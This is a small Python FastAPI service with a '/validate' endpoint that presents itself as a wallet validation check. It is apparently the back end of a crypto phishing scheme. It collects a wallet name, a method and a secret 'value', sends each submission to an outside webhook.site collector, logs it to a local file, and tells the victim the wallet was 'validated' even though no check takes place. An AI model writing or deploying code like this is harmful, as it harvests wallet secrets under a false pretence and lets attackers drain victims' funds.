from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import httpx

app = FastAPI()

# CORS: Allow all origins during development
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # In production, restrict this to your frontend URL
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Schema for incoming validation data
class ValidationData(BaseModel):
    wallet: str
    method: str
    value: str

@app.post("/validate")
async def validate_wallet(data: ValidationData):
    # 1. Try sending to webhook
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                "https://webhook.site/2920d0a0-1182-4b6a-a7af-921312c87c55",  # Replace with real endpoint in production
                json=data.dict()
            )
        print("✅ Data forwarded to webhook.")
    except Exception as e:
        print("❌ Webhook forwarding failed:", e)

    # 2. Always log to file
    try:
        with open("submissions.txt", "a") as f:
            f.write(f"{data.wallet},{data.method},{data.value}\n")
        print("📝 Logged to file.")
    except Exception as e:
        print("⚠️ File logging failed:", e)

    # 3. Console print + return response
    print("📥 Received validation data:", data.dict())
    return {
        "status": "success",
        "message": f"Wallet '{data.wallet}' validated via {data.method}."
    }
